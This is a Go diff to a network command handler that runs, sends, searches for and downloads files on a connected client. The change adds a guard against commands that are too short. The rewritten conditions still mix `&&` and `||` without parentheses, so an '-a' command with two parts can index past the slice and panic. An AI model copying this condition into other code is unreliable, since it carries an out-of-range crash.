@@ -96,57 +96,57 @@ func handleServer(session *Server, input string, conn net.Conn) {
 
 	case "run":
 		file := ""
-		if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
+		if len(parts) < 2{
+			fmt.Println(h.E, "Invalid run command")
+			return
+		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
 			file = parts[2]
 			session.ClientRunApp(file, parts[1], conn)
 		} else if len(parts) == 2 {
 			file = parts[1]
 			session.ClientRunApp(file, "", conn)
-		} else {
-			fmt.Println(h.E, "Invalid run command")
-			return
 		}
 		
 
 	case "send":
 		file := ""
-		if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
+		if len(parts) < 2{
+			fmt.Println(h.E, "Invalid send command")
+			return
+		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
 			file = parts[2]
 			session.ServerSendFile(file, parts[1], conn)
 		} else if len(parts) == 2 {
 			file = parts[1]
 			session.ServerSendFile(file, "", conn)
-		} else {
-			fmt.Println(h.E, "Invalid send command")
-			return
 		}
 		
 
 	case "search":
 		file := ""
-		if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
+		if len(parts) < 2{
+			fmt.Println(h.E, "Invalid search command")
+			return
+		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
 			file = parts[2]
 			session.ClientSearchFile(file, parts[1],conn)
 		} else if len(parts) == 2 {
 			file = parts[1]
 			session.ClientSearchFile(file, "", conn)
-		} else {
-			fmt.Println(h.E, "Invalid search command")
-			return
 		}
 		
 
 	case "download":
 		file := ""
-		if len(parts) > 2 && parts[1] == "-g" ||  parts[1] == "-a" {
+		if len(parts) < 2{
+			fmt.Println(h.E, "Invalid download command")
+			return
+		}else if len(parts) > 2 && parts[1] == "-g" ||  parts[1] == "-a" {
 			file = parts[2]
 			session.ClientDownFile(file, parts[1], conn)
 		} else if len(parts) == 2 {
 			file = parts[1]
 			session.ClientDownFile(file, "", conn)
-		} else {
-			fmt.Println(h.E, "Invalid download command")
-			return
 		}
 
 	case "entry":
